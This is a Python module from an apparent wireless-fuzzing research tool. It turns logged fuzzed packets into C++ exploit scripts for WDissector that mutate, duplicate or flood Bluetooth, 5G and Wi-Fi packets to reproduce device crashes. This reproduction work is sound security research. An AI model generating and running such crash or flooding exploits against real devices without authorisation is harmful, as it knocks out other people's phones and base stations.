import os
from string import Template

from fuzzlog.fuzzlog import BoardType, Crash, FuzzedPkt, FuzzLog, ProtocolType
from utils import ae_logger, convert_bytes_to_cpp_array, find_mutation_loc

from .exploiter import Exploiter


class WDissectorExploiter(Exploiter):
    def __init__(
        self,
        *,
        session_id: str,
        protocol: ProtocolType,
        board: BoardType,
        run_dir: str,
        fuzzlog: FuzzLog,
    ) -> None:
        super().__init__(
            session_id=session_id, protocol=protocol, board=board, fuzzlog=fuzzlog
        )
        self.run_dir = run_dir
        if self.protocol == "5g":
            self.exploit_prefix = "mac_sch_"
        else:
            self.exploit_prefix = ""

        exploit_folder_by_protocol = {
            "bt": "bluetooth",
            "5g": "5gnr_gnb",
            "wifi": "wifi_ap",
        }
        self.exploit_folder = (
            f"{run_dir}/modules/exploits/{exploit_folder_by_protocol[self.protocol]}"
        )

        self.exploit_template = Template(
            open("exploit_templates/exploit_bt.cpp.template", "r", encoding="utf8").read()
        )

        self.flood_exploit_template = Template(
            open(
                "exploit_templates/exploit_bt_flooding.cpp.template", "r", encoding="utf8"
            ).read()
        )

    def gen_script(self, trial_pkts: list[FuzzedPkt]):
        # In WDissector, 5G exploits file name needs to start with mac_sch_ or other prefixes
        exploit_name = f"{self.exploit_prefix}ae_{self.protocol}_{self.board}_w{len(trial_pkts)}_{ '_'.join([str(i.loc) for i in trial_pkts ]) }_{self.session_id}"
        exploit_path = f"{self.exploit_folder}/{exploit_name}.cpp"

        wd_filters_declaration = ""
        wd_filters_setup = ""
        wd_filter_registration = ""
        wd_filter_action = ""

        for idx, trial_pkt in enumerate(reversed(trial_pkts)):
            ae_logger.debug(
                f"trial_pkt.loc: {trial_pkt.loc}, trial_pkt.filter: {trial_pkt.filter}"
            )
            wd_filters_declaration += f"wd_filter_t f{idx+1};\n"
            wd_filters_setup += f"""f{idx+1} = wd_filter("{trial_pkt.filter}");\n    """
            wd_filter_registration += f"wd_register_filter(ctx->wd, f{idx+1});\n    "

            action = ""
            if trial_pkt.type == "mutation":
                mutations = ""
                for mutation in find_mutation_loc(
                    self.protocol, trial_pkt.prev_pkt_bytes, trial_pkt.pkt_bytes
                ):
                    if self.protocol == "5g":
                        mutations += (
                            f"        pkt_buf[{mutation[0]} - 48] = {mutation[1]};\n"
                        )
                    else:
                        mutations += f"        pkt_buf[{mutation[0]}] = {mutation[1]};\n"
                action = (
                    f"if (wd_read_filter(ctx->wd, f{idx+1}) && counter == {idx})"
                    "\n"
                    "    {"
                    "\n"
                    + mutations
                    + f'        wd_log_y("Send mutated packet now! State: {trial_pkt.state}");'
                    "\n"
                    f"        counter = {(idx+1)%len(trial_pkts)};"
                    "\n"
                    "        return 1;"
                    "\n"
                    "    }"
                    "\n"
                )
            elif trial_pkt.type == "duplication":
                # for OnePlus phone, no duplication-related crashes, but still leave logic here
                payload = trial_pkt.pkt_bytes
                if self.protocol == "wifi":
                    payload = payload[9:]
                action = (
                    f"if (wd_read_filter(ctx->wd, f{idx+1}) && counter == {idx})"
                    "\n"
                    "    {"
                    "\n"
                    f"        static uint8_t packet[] = {convert_bytes_to_cpp_array(payload)};"
                    "\n"
                    f"        m_send_packet(ctx, packet, {len(payload)}, 1);"
                    "\n"
                    f'        wd_log_y("Send duplicated packet now! State: {trial_pkt.state}");'
                    "\n"
                    f"        counter = {(idx+1)%len(trial_pkts)};"
                    "\n"
                    "    }"
                    "\n    "
                )
            else:
                # logger.error(f"Unknown fuzzed packet type: {trial_pkt.type}")
                pass

            wd_filter_action += action

        with open(exploit_path, "w", encoding="utf8") as f:
            exploit_content = self.exploit_template.substitute(
                wd_filters_declaration=wd_filters_declaration,
                wd_filters_setup=wd_filters_setup,
                wd_filter_registration=wd_filter_registration,
                wd_filter_action=wd_filter_action,
            )
            f.write(exploit_content)
            # Encountered some issues here, file created but not flushed to disk
            # then WDissector cannot find the file
            f.flush()
            os.fsync(f)

        return exploit_name, exploit_path

    def flood_script_generator(self, crash: Crash):
        for pkt in reversed(crash.fuzzed_pkts):
            if pkt.type == "mutation":
                continue
            if crash.iteration - pkt.iteration > 30:
                continue
            if pkt.state == "TX / LMP / LMP_detach":
                continue
            exploit_name = f"{self.exploit_prefix}ae_{self.protocol}_{self.board}_flooding_{pkt.loc}_{self.session_id}"
            exploit_path = f"{self.exploit_folder}/{exploit_name}.cpp"

            with open(exploit_path, "w", encoding="utf8") as f:
                f.write(
                    self.flood_exploit_template.substitute(
                        flooding_pkt=convert_bytes_to_cpp_array(pkt.pkt_bytes[:]),
                        pkt_state=pkt.state,
                    )
                )
            yield exploit_name, exploit_path

    # def run_exploit(self, exploit_name: str, exploit_path: str):
    #     crash_identifiers = []
    #     max_try = 3  # TODO
    #     for trial in range(max_try):
    #         try:
    #             crash_triggered, crash_identifier = self.run_exploit_once(
    #                 exploit_name, exploit_path
    #             )
    #         except Exception as e:
    #             ae_logger.error(e, exc_info=True)
    #             continue

    #         if not crash_triggered:
    #             break

    #         # TODO: check same crash
    #         if crash_identifier in crash_identifiers:
    #             break
    #         crash_identifiers.append(crash_identifier)

    #     return len(crash_identifiers) > 0, crash_identifiers
